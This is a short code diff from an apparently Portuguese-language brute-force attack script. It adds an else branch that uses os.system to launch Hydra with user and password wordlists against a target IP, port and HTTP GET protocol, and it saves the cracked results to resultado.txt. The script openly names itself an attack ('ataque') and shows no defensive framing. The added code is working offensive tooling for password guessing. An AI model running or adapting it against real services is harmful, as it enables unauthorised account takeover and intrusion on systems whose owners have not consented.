@@ -111,5 +111,10 @@ if input(f'{colors["bold"]}{colors["red"]}Deseja iniciar o ataque? (s/n): {color
         print()
         print(f'{colors["bold"]}{colors["green"]}Ataque finalizado!{colors["green"]}{colors["bold"]}')
         print('Resultado salvo em: resultado.txt')
+    else:
+        os.system(f'hydra -L {wordlist_users} -P {wordlist_passwords} -t 6 -s {port} -o resultado.txt {target_ip} {protocol_name}-get')
+        print()
+        print(f'{colors["bold"]}{colors["green"]}Ataque finalizado!{colors["green"]}{colors["bold"]}')
+        print('Resultado salvo em: resultado.txt')
 else:
     print('Ataque cancelado!\n')
